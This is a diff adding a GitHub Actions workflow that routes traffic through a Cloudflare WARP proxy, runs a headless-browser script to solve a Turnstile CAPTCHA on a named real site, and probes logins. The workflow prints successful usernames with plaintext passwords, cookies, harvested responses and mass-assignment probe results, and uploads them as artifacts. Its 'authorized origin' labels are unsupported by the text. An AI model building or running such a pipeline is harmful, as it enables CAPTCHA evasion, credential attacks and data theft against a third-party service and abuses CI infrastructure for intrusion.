@@ -1,0 +1,107 @@
+name: i74614warp
+on:
+  workflow_dispatch:
+    inputs:
+      nt:
+        description: "ntfy topic"
+        required: false
+        default: "i74614warpx"
+permissions:
+  contents: read
+jobs:
+  warp:
+    runs-on: ubuntu-latest
+    timeout-minutes: 75
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: runner identity
+        run: |
+          echo "=== runner ==="; id -u; uname -r
+          (curl -s --max-time 10 https://api.ipify.org || echo noip) | sed 's/^/PRE_EGRESS_IP=/'
+
+      - name: install + register Cloudflare WARP (proxy mode)
+        run: |
+          bash setup_warp.sh 2>&1 | tee warp_setup.log
+          cat warp_method.env 2>/dev/null || true
+
+      - name: install browser deps
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq xvfb >/dev/null 2>&1 || true
+          python3 -m pip install --quiet --upgrade pip
+          python3 -m pip install --quiet playwright "httpx[socks]"
+          python3 -m playwright install --with-deps chromium 2>&1 | tail -2
+          (google-chrome --version || chromium --version || echo no-system-chrome) 2>&1 | head -2
+
+      - name: pre-solve egress check (authorized origin)
+        run: |
+          SRC=$(grep -q "warp-cli-proxy" warp_method.env 2>/dev/null && echo socks5://127.0.0.1:40000 || echo "")
+          echo "PROXY_SOURCE=$SRC"
+          echo "--- direct ---"
+          curl -s -m 20 -o /tmp/st_direct.json -w "direct http=%{http_code} size=%{size_download}\n" https://yibuapi.com/api/status || echo direct_FAILED
+          head -c 500 /tmp/st_direct.json 2>/dev/null; echo
+          echo "--- via warp ---"
+          if [ -n "$SRC" ]; then
+            curl -s -m 30 -x "$SRC" -o /tmp/st_warp.json -w "warp http=%{http_code} size=%{size_download}\n" https://yibuapi.com/api/status || echo warp_FAILED
+            head -c 500 /tmp/st_warp.json 2>/dev/null; echo
+            curl -s -m 20 -x "$SRC" https://api.ipify.org | sed 's/^/WARP_EGRESS_IP=/'
+          fi
+
+      - name: solve + login probe (yibuapi.com authorized origin)
+        env:
+          NT: ${{ github.event.inputs.nt }}
+          TARGETS: "https://yibuapi.com,http://yibuapi.com"
+          SITEKEY: "0x4AAAAAAGA1XSFhsC_wKQEx"
+        run: |
+          set -o pipefail
+          SRC=$(grep -q "warp-cli-proxy" warp_method.env 2>/dev/null && echo socks5://127.0.0.1:40000 || echo "")
+          echo "PROXY_SOURCE=$SRC"
+          PROXY="$SRC" BUDGET=240 NT="$NT" TARGETS="$TARGETS" SITEKEY="$SITEKEY" \
+            xvfb-run -a --server-args="-screen 0 1280x900x24" python3 warp_probe80.py 2>&1 | tee probe80.log | tail -200 || true
+
+      - name: summarize
+        if: always()
+        run: |
+          python3 - <<'EOF'
+          import json
+          try:
+              d=json.load(open('results_probe80.json'))
+          except Exception as e:
+              print('no results', e); raise SystemExit
+          print('v', d.get('v'), 'targets', d.get('targets'), 'proxy', d.get('proxy'))
+          for a in d.get('attempts', []):
+              print('=== attempt', a.get('target'), 'sitekey_used', a.get('sitekey_used'))
+              print(' status', json.dumps(a.get('status'))[:600])
+              for r in a.get('conn_timeline',[]): print(' conn', json.dumps(r)[:300])
+              s=a.get('solve') or {}
+              print(' solve token_len', s.get('token_len'), 'origin', s.get('origin'),
+                    'clicked', len(s.get('clicks') or []), 'err', s.get('err'))
+              print(' page_log', s.get('page_log'))
+              for a2 in a.get('attempts',[]): print(' LOGIN',a2['u'],a2['status'],a2['body'][:220])
+              if a.get('login'): print(' LOGIN_SUCCESS', a['login']['username'], 'pass=', a['login']['password'], 'setc=', a['login'].get('setc'))
+              if a.get('cookies_after'): print(' COOKIES', json.dumps(a.get('cookies_after'))[:400])
+              for k,v in (a.get('harvest') or {}).items(): print(' HARVEST',k,v.get('status'),str(v.get('body'))[:300])
+              for k,v in (a.get('massassign') or {}).items(): print(' MASSASSIGN',k,v.get('status'),str(v.get('body'))[:300])
+          print('HITS', len(d.get('hits') or []))
+          for h in d.get('hits') or []: print(' HIT', json.dumps(h)[:1500])
+          if d.get('hits'):
+              json.dump(d['hits'], open('hits_74614.json','w'), indent=1)
+          EOF
+          echo "--- warp method ---"; cat warp_method.env 2>/dev/null
+
+      - name: upload diagnostics
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: diag74614
+          path: |
+            results_probe80.json
+            hits_74614.json
+            probe80.log
+            warp_setup.log
+            warp_method.env
+            last_probe80.html
+            last_probe80.png
+            shot_*.png
+          if-no-files-found: ignore
